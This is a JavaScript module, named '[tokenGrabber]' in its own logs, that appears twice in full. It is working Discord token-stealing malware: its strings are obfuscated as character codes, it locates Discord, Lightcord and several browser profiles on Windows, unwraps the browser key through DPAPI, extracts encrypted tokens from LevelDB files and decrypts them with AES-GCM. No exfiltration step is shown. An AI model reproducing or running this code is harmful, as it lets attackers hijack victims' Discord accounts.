const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
let unprotectData = null;
try {
  const _dp = require(String.fromCharCode(64,112,114,105,109,110,111,47,100,112,97,112,105));
  console.log('[tokenGrabber] @primno/dpapi loaded', !!_dp, '_dp.Dpapi', !!_dp && !!_dp.Dpapi, 'unprotectData', !!_dp && !!_dp.Dpapi && typeof _dp.Dpapi.unprotectData);
  unprotectData = _dp && _dp.Dpapi && _dp.Dpapi.unprotectData ? (b, e, s) => _dp.Dpapi.unprotectData(b, e, s) : null;
} catch (e) { console.log('[tokenGrabber] @primno/dpapi require error', e.message); }

const _L = process.env[String.fromCharCode(76,79,67,65,76,65,80,80,68,65,84,65)] || '';
const _R = process.env[String.fromCharCode(65,80,80,68,65,84,65)] || '';
const _T = [[76,111,99,97,108,32,83,116,97,116,101],[76,111,99,97,108,32,83,116,111,114,97,103,101],[108,101,118,101,108,100,98],[46,108,100,98],[111,115,95,99,114,121,112,116],[101,110,99,114,121,112,116,101,100,95,107,101,121],[117,116,102,56],[98,97,115,101,54,52],[67,117,114,114,101,110,116,85,115,101,114],[97,101,115,45,50,53,54,45,103,99,109],[71,111,111,103,108,101],[67,104,114,111,109,101],[85,115,101,114,32,68,97,116,97],[68,101,102,97,117,108,116],[77,105,99,114,111,115,111,102,116],[69,100,103,101],[66,114,97,118,101,83,111,102,116,119,97,114,101],[66,114,97,118,101,45,66,114,111,119,115,101,114],[89,97,110,100,101,120],[89,97,110,100,101,120,66,114,111,119,115,101,114],[86,105,118,97,108,100,105],[100,105,115,99,111,114,100],[100,105,115,99,111,114,100,99,97,110,97,114,121],[76,105,103,104,116,99,111,114,100],[100,105,115,99,111,114,100,112,116,98],[79,112,101,114,97,32,83,111,102,116,119,97,114,101],[79,112,101,114,97,32,83,116,97,98,108,101],[79,112,101,114,97,32,71,88,32,83,116,97,98,108,101],[80,65,84,72,83]];
const _s = (i) => String.fromCharCode.apply(null, _T[i]);
const _P = {
  [String.fromCharCode(68,105,115,99,111,114,100)]: _R + String.fromCharCode(92) + _s(21),
  [String.fromCharCode(68,105,115,99,111,114,100,32,67,97,110,97,114,121)]: _R + String.fromCharCode(92) + _s(22),
  [String.fromCharCode(76,105,103,104,116,99,111,114,100)]: _R + String.fromCharCode(92) + _s(23),
  [String.fromCharCode(68,105,115,99,111,114,100,32,80,84,66)]: _R + String.fromCharCode(92) + _s(24),
  [String.fromCharCode(79,112,101,114,97)]: _R + String.fromCharCode(92) + _s(25) + String.fromCharCode(92) + _s(26),
  [String.fromCharCode(79,112,101,114,97,32,71,88)]: _R + String.fromCharCode(92) + _s(25) + String.fromCharCode(92) + _s(27),
  [String.fromCharCode(67,104,114,111,109,101)]: path.join(_L, _s(10), _s(11), _s(12), _s(13)),
  [String.fromCharCode(77,105,99,114,111,115,111,102,116,32,69,100,103,101)]: path.join(_L, _s(14), _s(15), _s(12), _s(13)),
  [String.fromCharCode(66,114,97,118,101)]: path.join(_L, _s(16), _s(17), _s(12), _s(13)),
  [String.fromCharCode(89,97,110,100,101,120)]: path.join(_L, _s(18), _s(19), _s(12), _s(13)),
  [String.fromCharCode(86,105,118,97,108,100,105)]: path.join(_L, _s(20), _s(12), _s(13))
};
const _D = 5;
const _N = 3;
const _NL = 12;
const _TL = 16;

function getkey(_b) {
  const _f = path.join(_b, _s(0));
  try {
    const exists = fs.existsSync(_f);
    console.log('[tokenGrabber] getkey path', _f, 'exists', exists);
    if (!exists) return null;
    const _r = fs.readFileSync(_f, _s(6));
    const _j = JSON.parse(_r);
    const key = _j[_s(4)] && _j[_s(4)][_s(5)] ? _j[_s(4)][_s(5)] : null;
    console.log('[tokenGrabber] getkey has encrypted_key', !!key);
    return key;
  } catch (e) { console.log('[tokenGrabber] getkey error', e.message); return null; }
}

function gettokens(_b) {
  const _lp = path.join(_b, _s(1), _s(2));
  const _out = [];
  try {
    const exists = fs.existsSync(_lp);
    if (!exists) { console.log('[tokenGrabber] gettokens leveldb not exists', _lp); return _out; }
    const _files = fs.readdirSync(_lp);
    console.log('[tokenGrabber] gettokens path', _lp, 'files', _files.length);
    const _prefix = String.fromCharCode(100,81,119,52,119,57,87,103,88,99,81);
    for (const _file of _files) {
      if (!_file.endsWith(_s(3)) && !_file.endsWith(String.fromCharCode(46,108,111,103))) continue;
      try {
        const _c = fs.readFileSync(path.join(_lp, _file), String.fromCharCode(108,97,116,105,110,49));
        const _re1 = /dQw4w9WgXcQ:"([^"]+)"/g;
        const _re2 = /dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{50,})/g;
        let _m;
        while ((_m = _re1.exec(_c)) !== null) _out.push(_m[1]);
        while ((_m = _re2.exec(_c)) !== null) _out.push(_m[1]);
      } catch (_) {}
    }
    console.log('[tokenGrabber] gettokens raw count', _out.length);
  } catch (e) { console.log('[tokenGrabber] gettokens error', e.message); }
  return _out;
}

function decryptKey(_e) {
  console.log('[tokenGrabber] decryptKey unprotectData', !!unprotectData);
  if (!unprotectData) return null;
  try {
    const _buf = Buffer.from(_e, _s(7));
    console.log('[tokenGrabber] decryptKey buf.length', _buf.length);
    if (_buf.length <= _D) { console.log('[tokenGrabber] decryptKey buf too short'); return null; }
    const _blob = _buf.subarray(_D);
    const _key = unprotectData(_blob, null, _s(8));
    const ok = _key && _key.length >= 32;
    console.log('[tokenGrabber] decryptKey key result', !!_key, _key ? _key.length : 0);
    return ok ? (Buffer.isBuffer(_key) ? _key : Buffer.from(_key)) : null;
  } catch (e) { console.log('[tokenGrabber] decryptKey error', e.message); return null; }
}

function decryptToken(_e, _key) {
  try {
    const _raw = Buffer.from(_e, _s(7));
    if (_raw.length < _N + _NL + _TL) return null;
    const _nonce = _raw.subarray(_N, _N + _NL);
    const _ct = _raw.subarray(_N + _NL);
    const _tag = _ct.subarray(-_TL);
    const _data = _ct.subarray(0, -_TL);
    const _dec = crypto.createDecipheriv(_s(9), _key, _nonce);
    _dec.setAuthTag(_tag);
    return Buffer.concat([_dec.update(_data), _dec.final()]).toString(_s(6));
  } catch (e) { console.log('[tokenGrabber] decryptToken error', e.message); return null; }
}

function getTokens() {
  console.log('[tokenGrabber] getTokens platform', process.platform, 'unprotectData', !!unprotectData);
  if (process.platform !== String.fromCharCode(119,105,110,51,50) || !unprotectData) { console.log('[tokenGrabber] getTokens skip (not win32 or no dpapi)'); return Promise.resolve([]); }
  const _seen = new Set();
  const _out = [];
  try {
    for (const [_pl, _bp] of Object.entries(_P)) {
      const pathExists = fs.existsSync(_bp);
      if (!pathExists) continue;
      console.log('[tokenGrabber] getTokens checking path', _pl, _bp);
      const _kb = getkey(_bp);
      if (!_kb) continue;
      const _key = decryptKey(_kb);
      if (!_key) continue;
      const raws = gettokens(_bp);
      console.log('[tokenGrabber] getTokens raw tokens for', _pl, raws.length);
      for (const _raw of raws) {
        const _cl = _raw.replace(/\\/g, '');
        const _tok = decryptToken(_cl, _key);
        if (_tok && !_seen.has(_tok)) { _seen.add(_tok); _out.push(_tok); }
      }
    }
    console.log('[tokenGrabber] getTokens result count', _out.length);
  } catch (e) { console.log('[tokenGrabber] getTokens error', e.message); }
  return Promise.resolve(_out);
}

module.exports = { [_s(29)]: _P, getkey, gettokens, decryptKey, decryptToken, getTokens };
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
let unprotectData = null;
try {
  const _dp = require(String.fromCharCode(64,112,114,105,109,110,111,47,100,112,97,112,105));
  console.log('[tokenGrabber] @primno/dpapi loaded', !!_dp, '_dp.Dpapi', !!_dp && !!_dp.Dpapi, 'unprotectData', !!_dp && !!_dp.Dpapi && typeof _dp.Dpapi.unprotectData);
  unprotectData = _dp && _dp.Dpapi && _dp.Dpapi.unprotectData ? (b, e, s) => _dp.Dpapi.unprotectData(b, e, s) : null;
} catch (e) { console.log('[tokenGrabber] @primno/dpapi require error', e.message); }

const _L = process.env[String.fromCharCode(76,79,67,65,76,65,80,80,68,65,84,65)] || '';
const _R = process.env[String.fromCharCode(65,80,80,68,65,84,65)] || '';
const _T = [[76,111,99,97,108,32,83,116,97,116,101],[76,111,99,97,108,32,83,116,111,114,97,103,101],[108,101,118,101,108,100,98],[46,108,100,98],[111,115,95,99,114,121,112,116],[101,110,99,114,121,112,116,101,100,95,107,101,121],[117,116,102,56],[98,97,115,101,54,52],[67,117,114,114,101,110,116,85,115,101,114],[97,101,115,45,50,53,54,45,103,99,109],[71,111,111,103,108,101],[67,104,114,111,109,101],[85,115,101,114,32,68,97,116,97],[68,101,102,97,117,108,116],[77,105,99,114,111,115,111,102,116],[69,100,103,101],[66,114,97,118,101,83,111,102,116,119,97,114,101],[66,114,97,118,101,45,66,114,111,119,115,101,114],[89,97,110,100,101,120],[89,97,110,100,101,120,66,114,111,119,115,101,114],[86,105,118,97,108,100,105],[100,105,115,99,111,114,100],[100,105,115,99,111,114,100,99,97,110,97,114,121],[76,105,103,104,116,99,111,114,100],[100,105,115,99,111,114,100,112,116,98],[79,112,101,114,97,32,83,111,102,116,119,97,114,101],[79,112,101,114,97,32,83,116,97,98,108,101],[79,112,101,114,97,32,71,88,32,83,116,97,98,108,101],[80,65,84,72,83]];
const _s = (i) => String.fromCharCode.apply(null, _T[i]);
const _P = {
  [String.fromCharCode(68,105,115,99,111,114,100)]: _R + String.fromCharCode(92) + _s(21),
  [String.fromCharCode(68,105,115,99,111,114,100,32,67,97,110,97,114,121)]: _R + String.fromCharCode(92) + _s(22),
  [String.fromCharCode(76,105,103,104,116,99,111,114,100)]: _R + String.fromCharCode(92) + _s(23),
  [String.fromCharCode(68,105,115,99,111,114,100,32,80,84,66)]: _R + String.fromCharCode(92) + _s(24),
  [String.fromCharCode(79,112,101,114,97)]: _R + String.fromCharCode(92) + _s(25) + String.fromCharCode(92) + _s(26),
  [String.fromCharCode(79,112,101,114,97,32,71,88)]: _R + String.fromCharCode(92) + _s(25) + String.fromCharCode(92) + _s(27),
  [String.fromCharCode(67,104,114,111,109,101)]: path.join(_L, _s(10), _s(11), _s(12), _s(13)),
  [String.fromCharCode(77,105,99,114,111,115,111,102,116,32,69,100,103,101)]: path.join(_L, _s(14), _s(15), _s(12), _s(13)),
  [String.fromCharCode(66,114,97,118,101)]: path.join(_L, _s(16), _s(17), _s(12), _s(13)),
  [String.fromCharCode(89,97,110,100,101,120)]: path.join(_L, _s(18), _s(19), _s(12), _s(13)),
  [String.fromCharCode(86,105,118,97,108,100,105)]: path.join(_L, _s(20), _s(12), _s(13))
};
const _D = 5;
const _N = 3;
const _NL = 12;
const _TL = 16;

function getkey(_b) {
  const _f = path.join(_b, _s(0));
  try {
    const exists = fs.existsSync(_f);
    console.log('[tokenGrabber] getkey path', _f, 'exists', exists);
    if (!exists) return null;
    const _r = fs.readFileSync(_f, _s(6));
    const _j = JSON.parse(_r);
    const key = _j[_s(4)] && _j[_s(4)][_s(5)] ? _j[_s(4)][_s(5)] : null;
    console.log('[tokenGrabber] getkey has encrypted_key', !!key);
    return key;
  } catch (e) { console.log('[tokenGrabber] getkey error', e.message); return null; }
}

function gettokens(_b) {
  const _lp = path.join(_b, _s(1), _s(2));
  const _out = [];
  try {
    const exists = fs.existsSync(_lp);
    if (!exists) { console.log('[tokenGrabber] gettokens leveldb not exists', _lp); return _out; }
    const _files = fs.readdirSync(_lp);
    console.log('[tokenGrabber] gettokens path', _lp, 'files', _files.length);
    const _prefix = String.fromCharCode(100,81,119,52,119,57,87,103,88,99,81);
    for (const _file of _files) {
      if (!_file.endsWith(_s(3)) && !_file.endsWith(String.fromCharCode(46,108,111,103))) continue;
      try {
        const _c = fs.readFileSync(path.join(_lp, _file), String.fromCharCode(108,97,116,105,110,49));
        const _re1 = /dQw4w9WgXcQ:"([^"]+)"/g;
        const _re2 = /dQw4w9WgXcQ:([A-Za-z0-9+/=_-]{50,})/g;
        let _m;
        while ((_m = _re1.exec(_c)) !== null) _out.push(_m[1]);
        while ((_m = _re2.exec(_c)) !== null) _out.push(_m[1]);
      } catch (_) {}
    }
    console.log('[tokenGrabber] gettokens raw count', _out.length);
  } catch (e) { console.log('[tokenGrabber] gettokens error', e.message); }
  return _out;
}

function decryptKey(_e) {
  console.log('[tokenGrabber] decryptKey unprotectData', !!unprotectData);
  if (!unprotectData) return null;
  try {
    const _buf = Buffer.from(_e, _s(7));
    console.log('[tokenGrabber] decryptKey buf.length', _buf.length);
    if (_buf.length <= _D) { console.log('[tokenGrabber] decryptKey buf too short'); return null; }
    const _blob = _buf.subarray(_D);
    const _key = unprotectData(_blob, null, _s(8));
    const ok = _key && _key.length >= 32;
    console.log('[tokenGrabber] decryptKey key result', !!_key, _key ? _key.length : 0);
    return ok ? (Buffer.isBuffer(_key) ? _key : Buffer.from(_key)) : null;
  } catch (e) { console.log('[tokenGrabber] decryptKey error', e.message); return null; }
}

function decryptToken(_e, _key) {
  try {
    const _raw = Buffer.from(_e, _s(7));
    if (_raw.length < _N + _NL + _TL) return null;
    const _nonce = _raw.subarray(_N, _N + _NL);
    const _ct = _raw.subarray(_N + _NL);
    const _tag = _ct.subarray(-_TL);
    const _data = _ct.subarray(0, -_TL);
    const _dec = crypto.createDecipheriv(_s(9), _key, _nonce);
    _dec.setAuthTag(_tag);
    return Buffer.concat([_dec.update(_data), _dec.final()]).toString(_s(6));
  } catch (e) { console.log('[tokenGrabber] decryptToken error', e.message); return null; }
}

function getTokens() {
  console.log('[tokenGrabber] getTokens platform', process.platform, 'unprotectData', !!unprotectData);
  if (process.platform !== String.fromCharCode(119,105,110,51,50) || !unprotectData) { console.log('[tokenGrabber] getTokens skip (not win32 or no dpapi)'); return Promise.resolve([]); }
  const _seen = new Set();
  const _out = [];
  try {
    for (const [_pl, _bp] of Object.entries(_P)) {
      const pathExists = fs.existsSync(_bp);
      if (!pathExists) continue;
      console.log('[tokenGrabber] getTokens checking path', _pl, _bp);
      const _kb = getkey(_bp);
      if (!_kb) continue;
      const _key = decryptKey(_kb);
      if (!_key) continue;
      const raws = gettokens(_bp);
      console.log('[tokenGrabber] getTokens raw tokens for', _pl, raws.length);
      for (const _raw of raws) {
        const _cl = _raw.replace(/\\/g, '');
        const _tok = decryptToken(_cl, _key);
        if (_tok && !_seen.has(_tok)) { _seen.add(_tok); _out.push(_tok); }
      }
    }
    console.log('[tokenGrabber] getTokens result count', _out.length);
  } catch (e) { console.log('[tokenGrabber] getTokens error', e.message); }
  return Promise.resolve(_out);
}

module.exports = { [_s(29)]: _P, getkey, gettokens, decryptKey, decryptToken, getTokens };
